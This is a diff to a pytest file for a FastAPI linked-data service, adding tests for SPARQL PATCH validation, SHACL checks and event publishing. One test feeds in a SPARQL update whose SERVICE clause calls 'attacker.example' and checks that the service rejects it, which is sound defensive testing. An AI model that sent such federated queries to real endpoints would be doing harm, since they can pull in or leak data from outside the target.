@@ -9,9 +9,11 @@ import pytest
 from fastapi import FastAPI
 from fastapi.testclient import TestClient
 from rdflib import Graph, Literal, URIRef
+from rdflib.namespace import RDF
 
 from fdp.identity.deps import current_context
 from fdp.metadata.etag import compute_etag
+from fdp.metadata.events import RecordModified
 from fdp.metadata.graphs import meta_graph_uri
 from fdp.metadata.ldp import ContainerRegistry, build_ldp_router
 from fdp.metadata.ldp.negotiation import (
@@ -26,6 +28,7 @@ from fdp.metadata.shacl import InMemoryShapeProvider, ShaclValidator
 from fdp.policy.model import Action, Decision, Outcome
 from fdp.shared.context import RequestContext
 from fdp.shared.errors import register_exception_handlers
+from fdp.shared.events import EventBus
 from fdp.shared.namespaces import DCT
 
 RECORD_PATH = "/ldp/catalogs/c1"
@@ -133,21 +136,31 @@ class FakePDP:
 
 
 class FixedContainerRegistry:
-    """Container registry that flags a fixed set of IRIs and shape bindings."""
+    """Container registry that flags a fixed set of IRIs and shape bindings.
+
+    ``member_shapes`` maps container IRI → shape IRI for *new members* (POST).
+    ``resource_shapes`` maps resource IRI → shape IRI for the resource itself
+    (PATCH).
+    """
 
     def __init__(
         self,
         container_iris: set[str],
-        shape_for: dict[str, str] | None = None,
+        member_shapes: dict[str, str] | None = None,
+        resource_shapes: dict[str, str] | None = None,
     ) -> None:
         self._containers = set(container_iris)
-        self._shapes = dict(shape_for or {})
+        self._members = dict(member_shapes or {})
+        self._resources = dict(resource_shapes or {})
 
     def is_container(self, resource_iri: str) -> bool:
         return resource_iri in self._containers
 
     def member_shape(self, container_iri: str) -> str | None:
-        return self._shapes.get(container_iri)
+        return self._members.get(container_iri)
+
+    def shape_for(self, resource_iri: str) -> str | None:
+        return self._resources.get(resource_iri)
 
 
 # --- Fixtures ---------------------------------------------------------------
@@ -181,6 +194,7 @@ def _build_app(
     ctx: RequestContext | None = None,
     containers: ContainerRegistry | None = None,
     validator: ShaclValidator | None = None,
+    event_bus: EventBus | None = None,
 ) -> FastAPI:
     app = FastAPI()
     register_exception_handlers(app)
@@ -190,6 +204,7 @@ def _build_app(
             pdp=pdp,  # type: ignore[arg-type]
             validator=validator,
             containers=containers,
+            event_bus=event_bus,
         )
     )
     app.dependency_overrides[current_context] = lambda: ctx or _authenticated_ctx()
@@ -396,7 +411,7 @@ async def test_put_invalid_against_member_shape_returns_422() -> None:
     validator = ShaclValidator(InMemoryShapeProvider({DATASET_SHAPE_IRI: DATASET_SHAPE_TTL}))
     containers = FixedContainerRegistry(
         container_iris={RECORD_IRI},  # treat the target as a container for shape lookup
-        shape_for={RECORD_IRI: DATASET_SHAPE_IRI},
+        member_shapes={RECORD_IRI: DATASET_SHAPE_IRI},
     )
     app = _build_app(repo=repo, pdp=FakePDP(), validator=validator, containers=containers)
     # Body declares a dcat:Dataset but omits the required dct:title.
@@ -479,16 +494,13 @@ async def test_patch_wrong_content_type_returns_415() -> None:
 
 
 @pytest.mark.unit
-async def test_patch_runs_repository_update_and_returns_204() -> None:
+async def test_patch_applies_simulated_update_and_returns_204() -> None:
     repo, adapter = _make_repo()
     await _seed_record(repo, RECORD_IRI)
     current_etag = compute_etag(await repo.get_graph(RECORD_IRI))
 
     app = _build_app(repo=repo, pdp=FakePDP())
-    sparql = (
-        f"INSERT DATA {{ GRAPH <{RECORD_IRI}> "
-        f"{{ <{RECORD_IRI}> <{DCT.description}> \"added\" }} }}"
-    )
+    sparql = f'INSERT DATA {{ <> <{DCT.description}> "added" }}'
     with TestClient(app) as client:
         response = client.patch(
             RECORD_PATH,
@@ -497,10 +509,143 @@ async def test_patch_runs_repository_update_and_returns_204() -> None:
         )
 
     assert response.status_code == 204
-    assert adapter.update_calls == [sparql]
-    # version bumped via meta refresh
+    # Simulated locally then committed via replace_graph — not raw update.
+    assert adapter.update_calls == []
+    stored = adapter.graphs[RECORD_IRI]
+    assert (URIRef(RECORD_IRI), DCT.description, Literal("added")) in stored
     meta = adapter.graphs[str(meta_graph_uri(RECORD_IRI))]
     assert any(p == DCT.modified for _, p, _ in meta)
+
+
+@pytest.mark.unit
+async def test_patch_failing_post_state_shacl_returns_422_and_leaves_storage_unchanged() -> None:
+    repo, adapter = _make_repo()
+    # Seed a Dataset record with the required dct:title.
+    seed = Graph()
+    seed.add((URIRef(RECORD_IRI), RDF.type, URIRef("http://www.w3.org/ns/dcat#Dataset")))
+    seed.add((URIRef(RECORD_IRI), DCT.title, Literal("ok")))
+    await repo.put_graph(RECORD_IRI, seed, creator=ALICE)
+    snapshot = sorted(str(t) for t in adapter.graphs[RECORD_IRI])
+    current_etag = compute_etag(await repo.get_graph(RECORD_IRI))
+
+    validator = ShaclValidator(InMemoryShapeProvider({DATASET_SHAPE_IRI: DATASET_SHAPE_TTL}))
+    containers = FixedContainerRegistry(
+        container_iris=set(),
+        resource_shapes={RECORD_IRI: DATASET_SHAPE_IRI},
+    )
+    app = _build_app(repo=repo, pdp=FakePDP(), validator=validator, containers=containers)
+
+    # Delete the required title — post-update graph should fail SHACL.
+    sparql = f'DELETE DATA {{ <> <{DCT.title}> "ok" }}'
+    with TestClient(app) as client:
+        response = client.patch(
+            RECORD_PATH,
+            content=sparql.encode("utf-8"),
+            headers={"content-type": SPARQL_UPDATE, "if-match": f'"{current_etag}"'},
+        )
+
+    assert response.status_code == 422
+    assert response.json()["code"] == "fdp.schema_violation"
+    # Storage unchanged.
+    assert sorted(str(t) for t in adapter.graphs[RECORD_IRI]) == snapshot
+
+
+@pytest.mark.unit
+async def test_patch_rejects_body_with_service_clause() -> None:
+    repo, _ = _make_repo()
+    await _seed_record(repo, RECORD_IRI)
+    etag = compute_etag(await repo.get_graph(RECORD_IRI))
+    app = _build_app(repo=repo, pdp=FakePDP())
+    sparql = (
+        "INSERT { ?s <http://example.org/p> ?o } WHERE { "
+        "SERVICE <http://attacker.example/> { ?s ?p ?o } }"
+    )
+    with TestClient(app) as client:
+        response = client.patch(
+            RECORD_PATH,
+            content=sparql.encode("utf-8"),
+            headers={"content-type": SPARQL_UPDATE, "if-match": f'"{etag}"'},
+        )
+    assert response.status_code == 400
+    assert response.json()["code"] == "fdp.bad_request"
+
+
+@pytest.mark.unit
+async def test_patch_malformed_sparql_returns_400() -> None:
+    repo, _ = _make_repo()
+    await _seed_record(repo, RECORD_IRI)
+    etag = compute_etag(await repo.get_graph(RECORD_IRI))
+    app = _build_app(repo=repo, pdp=FakePDP())
+    with TestClient(app) as client:
+        response = client.patch(
+            RECORD_PATH,
+            content=b"INSERT DATA { <oops",
+            headers={"content-type": SPARQL_UPDATE, "if-match": f'"{etag}"'},
+        )
+    assert response.status_code == 400
+    assert response.json()["code"] == "fdp.bad_request"
+
+
+@pytest.mark.unit
+async def test_patch_publishes_record_modified_event_on_success() -> None:
+    repo, _ = _make_repo()
+    await _seed_record(repo, RECORD_IRI)
+    etag = compute_etag(await repo.get_graph(RECORD_IRI))
+
+    bus = EventBus()
+    received: list[RecordModified] = []
+
+    async def handler(evt: RecordModified) -> None:
+        received.append(evt)
+
+    sub = bus.subscribe(RecordModified, handler)
+    try:
+        app = _build_app(repo=repo, pdp=FakePDP(), event_bus=bus)
+        sparql = f'INSERT DATA {{ <> <{DCT.description}> "extra" }}'
+        with TestClient(app) as client:
+            response = client.patch(
+                RECORD_PATH,
+                content=sparql.encode("utf-8"),
+                headers={"content-type": SPARQL_UPDATE, "if-match": f'"{etag}"'},
+            )
+    finally:
+        sub.unsubscribe()
+
+    assert response.status_code == 204
+    assert len(received) == 1
+    evt = received[0]
+    assert evt.record_iri == RECORD_IRI
+    assert evt.subject == ALICE
+    new_etag = response.headers["etag"].strip('"')
+    assert evt.etag == new_etag
+
+
+@pytest.mark.unit
+async def test_patch_does_not_publish_event_on_failure() -> None:
+    repo, _ = _make_repo()
+    await _seed_record(repo, RECORD_IRI)
+    etag = compute_etag(await repo.get_graph(RECORD_IRI))
+
+    bus = EventBus()
+    received: list[RecordModified] = []
+
+    async def handler(evt: RecordModified) -> None:
+        received.append(evt)
+
+    sub = bus.subscribe(RecordModified, handler)
+    try:
+        app = _build_app(repo=repo, pdp=FakePDP(), event_bus=bus)
+        with TestClient(app) as client:
+            response = client.patch(
+                RECORD_PATH,
+                content=b"INSERT DATA { <oops",
+                headers={"content-type": SPARQL_UPDATE, "if-match": f'"{etag}"'},
+            )
+    finally:
+        sub.unsubscribe()
+
+    assert response.status_code == 400
+    assert received == []
 
 
 @pytest.mark.unit
